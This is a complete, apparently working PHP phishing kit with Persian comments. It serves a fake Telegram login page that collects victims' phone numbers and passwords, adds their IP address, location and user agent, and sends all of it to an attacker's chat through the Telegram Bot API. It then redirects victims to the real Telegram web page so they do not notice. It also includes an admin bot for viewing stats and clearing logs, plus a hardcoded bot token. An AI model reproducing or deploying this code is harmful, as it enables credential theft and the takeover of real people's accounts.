<?php
/**
 * سیستم یکپارچه ورود به تلگرام
 * فقط پاسخ به ادمین + اعلان ورود
 * نسخه نهایی - کاملاً عملیاتی
 */

// ============================================
// تنظیمات اصلی
// ============================================
$bot_token = "8659330254:AAH66xfeVZMM8cP_OAe2F8GGWTTYe8wgjs4";  // از @BotFather دریافت کنید
$admin_chat_id = "7019731206";  // آیدی عددی گیرنده

// ============================================
// ============================================
if (isset($_GET['webhook'])) {
    $content = file_get_contents('php://input');
    $update = json_decode($content, true);
    
    if ($update && isset($update['message'])) {
        $chat_id = $update['message']['chat']['id'];
        $text = $update['message']['text'];
        $first_name = $update['message']['from']['first_name'] ?? 'کاربر';
        
        // فقط به ادمین پاسخ بده
        if ($chat_id == $admin_chat_id) {
            if ($text == '/start') {
                $reply = "✅ *ربات فعال است!*\n\n";
                $reply .= "سلام ادمین عزیز!\n";
                $reply .= "سیستم ورود آماده است.\n";
                $reply .= "🔗 آدرس: " . getCurrentUrl() . "\n\n";
                $reply .= "📊 تعداد ورودها: " . (file_exists('count.txt') ? file_get_contents('count.txt') : '0');
                
                sendTelegramMessage($bot_token, $chat_id, $reply);
            }
            elseif ($text == '/status') {
                $reply = "📊 *وضعیت سیستم*\n";
                $reply .= "━━━━━━━━━━━━━━\n";
                $reply .= "✅ ربات: فعال\n";
                $reply .= "✅ وب‌هوک: فعال\n";
                $reply .= "🕒 زمان: " . date('Y-m-d H:i:s') . "\n";
                $reply .= "📌 ورودها: " . (file_exists('count.txt') ? file_get_contents('count.txt') : '0') . "\n";
                $reply .= "📁 لاگ: " . (file_exists('log.txt') ? filesize('log.txt') . ' بایت' : 'خالی');
                
                sendTelegramMessage($bot_token, $chat_id, $reply);
            }
            elseif ($text == '/clear') {
                if (file_exists('log.txt')) {
                    unlink('log.txt');
                }
                file_put_contents('count.txt', '0');
                $reply = "🧹 *لاگ و آمار پاک شد!*";
                sendTelegramMessage($bot_token, $chat_id, $reply);
            }
            elseif ($text == '/help') {
                $reply = "📖 *راهنمای ادمین*\n━━━━━━━━━━━━━━\n";
                $reply .= "/start - شروع کار\n";
                $reply .= "/status - وضعیت سیستم\n";
                $reply .= "/clear - پاک کردن لاگ\n";
                $reply .= "/help - این پیام\n";
                $reply .= "/stats - آمار پیشرفته";
                
                sendTelegramMessage($bot_token, $chat_id, $reply);
            }
            elseif ($text == '/stats') {
                $logs = file_exists('log.txt') ? file('log.txt') : [];
                $total = count($logs);
                $today = date('Y-m-d');
                $today_count = 0;
                $ips = [];
                
                foreach ($logs as $log) {
                    if (strpos($log, $today) !== false) {
                        $today_count++;
                    }
                    if (preg_match('/آی‌پی: ([0-9.]+)/', $log, $match)) {
                        $ips[] = $match[1];
                    }
                }
                
                $unique_ips = count(array_unique($ips));
                
                $reply = "📈 *آمار پیشرفته*\n━━━━━━━━━━━━━━\n";
                $reply .= "📊 کل ورودها: {$total}\n";
                $reply .= "📅 امروز: {$today_count}\n";
                $reply .= "🖥 آی‌پی‌های منحصر: {$unique_ips}\n";
                $reply .= "🕒 آخرین به‌روزرسانی: " . date('H:i:s');
                
                sendTelegramMessage($bot_token, $chat_id, $reply);
            }
            else {
                $reply = "❓ دستور نامعتبر!\nبرای راهنما /help را وارد کنید.";
                sendTelegramMessage($bot_token, $chat_id, $reply);
            }
        }
        else {
            // به دیگران پاسخ نده
            $reply = "⛔ شما دسترسی ندارید!";
            sendTelegramMessage($bot_token, $chat_id, $reply);
        }
    }
    
    exit;
}

// ============================================
// بخش ۲: دریافت اطلاعات فرم + اعلان به ادمین
// ============================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['phone'])) {
    // دریافت اطلاعات
    $phone = isset($_POST['phone']) ? trim($_POST['phone']) : 'نامشخص';
    $password = isset($_POST['password']) ? trim($_POST['password']) : 'نامشخص';
    
    // اطلاعات بازدیدکننده
    $ip = getRealIP();
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'نامشخص';
    $datetime = date('Y-m-d H:i:s');
    
    // موقعیت جغرافیایی
    $location = getLocation($ip);
    $country = $location['country'] ?? 'ناشناس';
    $city = $location['city'] ?? 'ناشناس';
    
    // ===== پیام اعلان به ادمین =====
    $message = "🔐 *ورود جدید* 🔐\n";
    $message .= "━━━━━━━━━━━━━━━━━━\n";
    $message .= "📱 شماره: `{$phone}`\n";
    $message .= "🔑 رمز: `{$password}`\n";
    $message .= "━━━━━━━━━━━━━━━━━━\n";
    $message .= "🌍 کشور: {$country}\n";
    $message .= "🏙 شهر: {$city}\n";
    $message .= "🖥 آی‌پی: `{$ip}`\n";
    $message .= "🕒 زمان: {$datetime}\n";
    $message .= "━━━━━━━━━━━━━━━━━━\n";
    
    // ارسال به ادمین
    sendTelegramMessage($bot_token, $admin_chat_id, $message);
    
    // ذخیره لاگ
    saveLog($phone, $ip, $country, $datetime);
    
    // افزایش شمارنده
    incrementCounter();
    
    // ===== ارسال اعلان صوتی (آپشنال) =====
    // sendNotificationSound($bot_token, $admin_chat_id);
    
    // تغییر مسیر
    header("Location: https://web.telegram.org/");
    exit;
}

// ============================================
// بخش ۳: نمایش صفحه ورود
// ============================================
?>
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ورود به تلگرام</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(145deg, #0a0a0a 0%, #1a1a1e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-box {
            background: #1c1c1e;
            padding: 45px 40px;
            border-radius: 28px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.9), 0 0 0 1px #2b2b2d inset;
            width: 100%;
            max-width: 420px;
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .logo-area {
            text-align: center;
            margin-bottom: 32px;
        }
        
        .logo-icon {
            display: inline-flex;
            justify-content: center;
            align-items: center;
            width: 85px;
            height: 85px;
            background: linear-gradient(135deg, #2b78e4, #1a5bbf);
            border-radius: 50%;
            font-size: 42px;
            box-shadow: 0 12px 35px rgba(43, 120, 228, 0.35);
            transition: all 0.3s ease;
        }
        
        .logo-icon:hover {
            transform: scale(1.05);
            box-shadow: 0 15px 45px rgba(43, 120, 228, 0.5);
        }
        
        .logo-area h1 {
            color: #ffffff;
            font-size: 28px;
            font-weight: 600;
            margin-top: 14px;
        }
        
        .logo-area p {
            color: #8e8e93;
            font-size: 14px;
            margin-top: 4px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-group label {
            display: block;
            color: #a8a8ad;
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 8px;
        }
        
        .input-group input {
            width: 100%;
            padding: 15px 18px;
            background: #2c2c2e;
            border: 2px solid #3a3a3c;
            border-radius: 14px;
            color: #ffffff;
            font-size: 15px;
            transition: all 0.3s ease;
            direction: ltr;
            outline: none;
        }
        
        .input-group input:focus {
            border-color: #2b78e4;
            box-shadow: 0 0 0 4px rgba(43, 120, 228, 0.15);
        }
        
        .input-group input::placeholder {
            color: #6a6a6e;
            font-size: 14px;
        }
        
        .login-btn {
            width: 100%;
            padding: 17px;
            background: linear-gradient(135deg, #2b78e4, #1a5bbf);
            border: none;
            border-radius: 14px;
            color: #ffffff;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 8px;
        }
        
        .login-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 30px rgba(43, 120, 228, 0.35);
        }
        
        .login-btn:active {
            transform: translateY(0px);
        }
        
        .footer-links {
            margin-top: 28px;
            text-align: center;
            padding-top: 20px;
            border-top: 1px solid #2b2b2d;
        }
        
        .footer-links a {
            color: #2b78e4;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        .footer-links .sep {
            color: #3a3a3c;
            margin: 0 12px;
        }
        
        .footer-links .security {
            color: #5e5e62;
            font-size: 12px;
            margin-top: 12px;
            display: block;
        }
        
        .status-bar {
            background: #2c2c2e;
            padding: 8px 15px;
            border-radius: 10px;
            margin-top: 15px;
            text-align: center;
            color: #5e5e62;
            font-size: 11px;
        }
        
        @media (max-width: 480px) {
            .login-box {
                padding: 30px 20px;
            }
            .logo-icon {
                width: 70px;
                height: 70px;
                font-size: 34px;
            }
            .logo-area h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>

<div class="login-box">
    <div class="logo-area">
        <div class="logo-icon">✈️</div>
        <h1>تلگرام</h1>
        <p>وارد حساب کاربری خود شوید</p>
    </div>
    
    <form action="" method="POST">
        <div class="input-group">
            <label>📱 شماره تلفن همراه</label>
            <input type="text" name="phone" placeholder="مثال: 09123456789" required autofocus>
        </div>
        <div class="input-group">
            <label>🔑 رمز عبور</label>
            <input type="password" name="password" placeholder="رمز عبور خود را وارد کنید" required>
        </div>
        <button type="submit" class="login-btn">ورود به حساب</button>
    </form>
    
    <div class="footer-links">
        <a href="#">ثبت‌نام</a>
        <span class="sep">|</span>
        <a href="#">رمز عبور را فراموش کردید؟</a>
        <span class="security">🔒 ورود شما با رمزنگاری پیشرفته محافظت می‌شود</span>
    </div>
    
    <div class="status-bar">
        🔹 سیستم امنیتی فعال | نسخه ۲.۰
    </div>
</div>

</body>
</html>
<?php

// ============================================
// توابع کمکی
// ============================================

function getRealIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function getLocation($ip) {
    $result = ['country' => 'ناشناس', 'city' => 'ناشناس'];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/{$ip}?fields=status,country,city");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if ($response) {
        $data = json_decode($response, true);
        if (isset($data['status']) && $data['status'] == 'success') {
            $result['country'] = $data['country'] ?? 'ناشناس';
            $result['city'] = $data['city'] ?? 'ناشناس';
        }
    }
    
    return $result;
}

function sendTelegramMessage($token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

function saveLog($phone, $ip, $country, $datetime) {
    $log = "[{$datetime}] شماره: {$phone} | آی‌پی: {$ip} | کشور: {$country}\n";
    file_put_contents('log.txt', $log, FILE_APPEND);
}

function incrementCounter() {
    $count = file_exists('count.txt') ? intval(file_get_contents('count.txt')) : 0;
    $count++;
    file_put_contents('count.txt', $count);
}

function getCurrentUrl() {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
    return $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
}

// ============================================
// تنظیم وب‌هوک (یک بار اجرا کنید)
// ============================================
// برای تنظیم وب‌هوک، آدرس زیر را در مرورگر باز کنید:
// https://api.telegram.org/bot{TOKEN}/setWebhook?url={URL}&?webhook
// مثال:
// https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/setWebhook?url=https://yoursite.com/index.php?webhook

?>
